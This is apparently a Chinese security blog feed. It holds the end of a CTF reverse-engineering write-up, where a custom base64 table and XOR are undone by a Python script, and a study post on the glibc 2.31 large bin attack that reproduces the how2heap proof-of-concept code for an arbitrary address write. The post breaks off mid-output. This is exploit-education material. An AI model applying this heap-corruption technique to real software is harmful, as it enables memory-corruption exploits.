class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是对我们的输入字符串，每一个字符按位置进行与操作。</p><p>fun1是字符串的base64加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v16 &lt; a3 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = v13;</span><br><span class="line">  v14 = v13 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v3) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + a1) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v11 = <span class="number">16</span> * *(_BYTE *)(v16 + a1) &amp; <span class="number">0x30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">1</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v14;</span><br><span class="line">    v5 = v14 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v4) = Str[v11];</span><br><span class="line">    *(_BYTE *)(v5 + a2) = <span class="string">'='</span>;</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    v13 = v5 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v6 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v14;</span><br><span class="line">  v15 = v14 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v7) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">1</span> + a1) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span> | v11];</span><br><span class="line">  v12 = <span class="number">4</span> * *(_BYTE *)(v16 + <span class="number">1</span> + a1) &amp; <span class="number">0x3C</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">2</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v15) = Str[v12];</span><br><span class="line">    v8 = v15 + <span class="number">1</span>;</span><br><span class="line">    v13 = v15 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v8 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a2 + v15) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">2</span> + a1) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span> | v12];</span><br><span class="line">  v9 = v15 + <span class="number">1</span>;</span><br><span class="line">  v13 = v15 + <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v9) = Str[*(_BYTE *)(v16 + <span class="number">2</span> + a1) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v16 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但在调试时，发现在fun1之前，有个函数将全局变量str值改动了</p><p>这个函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_401536</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// ST13_1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strlen</span>(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v2 / <span class="number">2</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; v2 - i - <span class="number">1</span> &gt; j; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] &gt; Str[j + <span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = Str[j];</span><br><span class="line">        Str[j] = Str[j + <span class="number">1</span>];</span><br><span class="line">        Str[j + <span class="number">1</span>] = v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  dword_406060 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是写脚本还愿str：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">base_flag=[]</span><br><span class="line"><span class="comment">#x='7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">x=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">v2 = len(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">for ( i = 0; v2 / 2 &gt; i; ++i )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    for ( j = 0; v2 - i - 1 &gt; j; ++j )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( Str[j] &gt; Str[j + 1] )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v0 = Str[j];</span></span><br><span class="line"><span class="string">        Str[j] = Str[j + 1];</span></span><br><span class="line"><span class="string">        Str[j + 1] = v0;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    base_flag.append(ord(i))</span><br><span class="line">print(base_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(v2//<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(v2-i<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> base_flag[j]&gt;base_flag[j+<span class="number">1</span>]:</span><br><span class="line">            v0=base_flag[j]</span><br><span class="line">            base_flag[j]=base_flag[j+<span class="number">1</span>]</span><br><span class="line">            base_flag[j+<span class="number">1</span>]=v0</span><br></pre></td></tr></table></figure><p>得到真正的str：<code>ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz</code></p><p>在对fun1函数和fun2函数逆向换源，得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">table = <span class="string">'ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">table2 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">'7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">tmp2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">index = table.index(i)</span><br><span class="line">tmp2 += table2[index]</span><br><span class="line"></span><br><span class="line">k=base64.b64decode(tmp2+<span class="string">'=='</span>)</span><br><span class="line">nre=<span class="string">''</span></span><br><span class="line">kk=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)):</span><br><span class="line">    kk.append(ord(k[i]))</span><br><span class="line"></span><br><span class="line">print(kk)</span><br><span class="line">a2=len(kk)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range((<span class="number">10</span>)):</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(kk)):</span><br><span class="line"></span><br><span class="line">        print(str(a2%i)+<span class="string">''</span>+str(i))</span><br><span class="line">        <span class="keyword">if</span> a2%i!=<span class="number">0</span>:</span><br><span class="line">            kk[j]^=(i+j)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            kk[j]^=((j%i)+j)</span><br><span class="line">    print(kk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(k)</span></span><br><span class="line">print(kk)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (kk):</span><br><span class="line">    flag+=chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填完表就有flag</p><p><img src="image-20211127162357150.png" alt="image-20211127162357150"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large bin Attack for Glibc 2.31 学习</title>
      <link href="/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉<del>~</del>(◞‸◟ )tcl…）<a id="more"></a></p><h2 id="Large-bin-Attack目的"><a href="#Large-bin-Attack目的" class="headerlink" title="Large bin Attack目的"></a>Large bin Attack目的</h2><p>Large bin Attack的目的是 利用Large bin 向任意一地址任意一个地址写入一个大数(p2 chunk addr).</p><h2 id="how2heap-源码学习"><a href="#how2heap-源码学习" class="headerlink" title="how2heap 源码学习"></a>how2heap 源码学习</h2><p>经过信息收集，发现在how2heap中更新了Large bin Attack 源码。(ps:菜鸡才知道正版<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>项目有团队在不断维护，中文翻译版how2heap已经没有维护了，啊这…..)</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">        fwd = bck;</span></span><br><span class="line"><span class="comment">        bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 1 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 2 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (bck-&gt;fd != fwd)\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Once again, allocate a guard chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"At this point, we have one chunk in large bin [p1] (%p),\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"               and one chunk in unsorted bin [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n"</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"  the modified p1-&gt;bk_nextsize does not trigger any error\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n"</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n"</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Target (%p) : %p\n"</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="新保护"><a href="#新保护" class="headerlink" title="新保护"></a>新保护</h3><p>由上文源码所说，在2.30后libc 增加了两个检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#check 1：</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n<span class="string">");</span></span><br><span class="line">  malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)\n");</span><br><span class="line"><span class="meta">#check 2:</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br></pre></td></tr></table></figure><p>先说check 2：对当前bin的bk值对应bin的 fd是否为当前bin。</p><p>check 1 对largebin的bk_nextsize进行了跟bk一样的检查，即当前bin的bk_nextsize值对应bin的 fd_nextsize是否为当前bin。</p><h3 id="新利用点"><a href="#新利用点" class="headerlink" title="新利用点"></a>新利用点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这源码中，核心就是利用这段代码。这部分完整的源码在<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831</a></p><p>这个代码在unsorted bin加入largebin时，若unsorted bin 大小大于目前最大largebin时触发。在触发时，被未对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行检查，就直接向<code>victim-&gt;bk_nextsize-&gt;fd_nextsize</code>写入victim的地址。</p><h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><p>首先我们如下写创建4个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"> <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br></pre></td></tr></table></figure><p>让p1 加入了larger bin，此时:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 